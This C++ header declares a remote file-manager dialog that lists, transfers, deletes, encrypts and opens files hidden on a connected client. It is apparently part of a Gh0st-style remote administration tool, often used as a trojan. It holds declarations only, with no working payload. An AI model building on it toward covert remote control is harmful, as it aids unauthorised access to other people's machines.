#pragma once
#include "stdafx.h"
#include "CFileListCtrl.h"
#include <Resource.h>

#define	MAX_WRITE_RETRY		15
#define MAX_SEND_BUFFER		65535
#define	MAX_RECV_BUFFER		65535

namespace file
{

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog
typedef CList<CString, CString&> strList;

typedef struct {
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
    BOOL    error;
} FILESIZE;

typedef struct {
    TCHAR SearchFileName[MAX_PATH];
    TCHAR SearchPath[MAX_PATH];
    BOOL bEnabledSubfolder;
} FILESEARCH;

typedef struct {
    LVITEM* plvi;
    CString sCol2;
} lvItem, * plvItem;

typedef struct {
    BYTE Token;
    int  w, h, size;

} FILEPICINFO;


class CFileManagerDlg : public DialogBase
{
    // Construction
public:
    CString strLpath;
    CString m_strDesktopPath;
    CString  GetDirectoryPath(BOOL bIncludeFiles);
    bool m_bCanAdmin, m_bUseAdmin, m_bIsStop;
    CString m_strReceiveLocalFile;
    CString m_strUploadRemoteFile;
    void ShowProgress();
    void SendStop(BOOL bIsDownload);
    int m_nTransferMode;
    CString m_hCopyDestFolder;
    void SendContinue();
    void SendException();
    void EndLocalRecvFile();
    void EndRemoteDeleteFile();
    CString ExtractNameFromFullPath(CString szFullPath);
    HANDLE m_hFileSend;
    HANDLE m_hFileRecv;
    CString m_strOperatingFile; // 文件名
    CString m_strFileName; // 操作文件名
    __int64 m_nOperatingFileLength; // 文件总大小
    __int64	m_nCounter;// 计数器
    void WriteLocalRecvFile();
    void CreateLocalRecvFile();
    BOOL SendDownloadJob();
    BOOL SendUploadJob();
    BOOL SendDeleteJob();

    strList m_Remote_Download_Job;
    strList m_Remote_Upload_Job;
    strList m_Remote_Delete_Job;

    void ShowMessage(TCHAR* lpFmt, ...);
    CString m_Remote_Path;
    CStringA CopyFileNAme;;
    BYTE m_bRemoteDriveList[2048];
    CString GetParentDirectory(CString strPath);
    void OnReceiveComplete();
    void OnReceive();
    void SearchEnd();			// 搜索结束
    void FixedRemoteSearchFileList(BYTE* pbBuffer, DWORD dwBufferLen);
    int m_nNewIconBaseIndex; // 新加的ICON
    CProgressCtrl* m_ProgressCtrl;
    HCURSOR m_hCursor;
    CString m_Local_Path;
    bool FixedUploadDirectory(LPCTSTR lpPathName);
    void FixedRemoteDriveList();
    void GetRemoteFileList(CString directory = _T(""));
    void FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen);
    void fixNetHood(BYTE* pbuffer, int buffersize);//远程共享目录
    bool id_search_result;
    CStatusBar m_wndStatusBar;
    CFileManagerDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext* pContext = NULL);
    ~CFileManagerDlg()
    {
        m_bIsClosed = TRUE;
        SAFE_DELETE(m_ProgressCtrl);
    }
    enum {
        IDD = IDD_FILE_WINOS
    };
    CComboBox	m_Remote_Directory_ComboBox;
    CComboBox	m_Local_Directory_ComboBox;
    CFileListCtrl	m_list_remote;
    CListCtrl	m_list_remote_driver;
    CListCtrl m_list_remote_search;
    CImageList  I_ImageList0;
    CImageList  I_ImageList1;
    CButton	m_BtnSearch;
    CString	m_SearchStr;
    BOOL	m_bSubFordle;

    BOOL DRIVE_Sys;
    BOOL DRIVE_CAZ;

    __int64	Bf_nCounters; // 备份计数器  由于比较用
    LONG	Bf_dwOffsetHighs;
    LONG	Bf_dwOffsetLows;

    void TransferSend(CString	file);
public:
    virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
    virtual void PostNcDestroy();
    virtual void OnClose();
protected:

    virtual BOOL OnInitDialog();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnTimer(UINT_PTR nIDEvent);
    afx_msg void OnBeginDragListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
    afx_msg void OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnDblclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnclkListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnclickListSearch(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnGo();
    afx_msg void OnRemotePrev();
    afx_msg void OnRemoteView();
    afx_msg void OnRemoteRecent();
    afx_msg void OnRemoteDesktop();
    afx_msg void OnRemoteCopy();
    afx_msg void OnTransferSend();
    afx_msg void OnRemoteDelete();
    afx_msg void OnRemoteStop();
    afx_msg void OnRemoteNewFolder();
    afx_msg void OnTransferRecv();
    afx_msg void OnRename();
    afx_msg void OnEndLabelEditListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnDelete();
    afx_msg void OnDeleteEnforce();
    afx_msg void OnNewFolder();
    afx_msg void OnRefresh();
    afx_msg void OnUseAdmin();
    afx_msg void OnRemoteOpenShow();
    afx_msg void OnRemoteOpenHide();
    afx_msg void OnRemoteEncryption();
    afx_msg void OnRemoteDecrypt();
    afx_msg void OnRemoteInfo();
    afx_msg void OnRemoteCopyFile();
    afx_msg void OnRemotePasteFile();
    afx_msg void OnRemotezip();
    afx_msg void OnRemotezipstop();
    afx_msg void OnRclickListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnRclickListSearch(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg BOOL MyShell_GetImageLists();
    afx_msg void OnCompress();
    afx_msg void OnUncompress();
    afx_msg void OnSetfocusRemotePath();
    afx_msg void OnBtnSearch();
    afx_msg void OnBnClickedSearchStop();
    afx_msg void OnBnClickedSearchResult();
    DECLARE_MESSAGE_MAP()

private:
    bool m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位
    BOOL m_bDragging;	// during a drag operation
    bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
    void SendTransferMode();
    void SendFileData();
    void EndLocalUploadFile();
    bool DeleteDirectory(LPCTSTR lpszDirectory);
    void EnableControl(BOOL bEnable = TRUE);

    void ShowSearchPlugList();
};
}
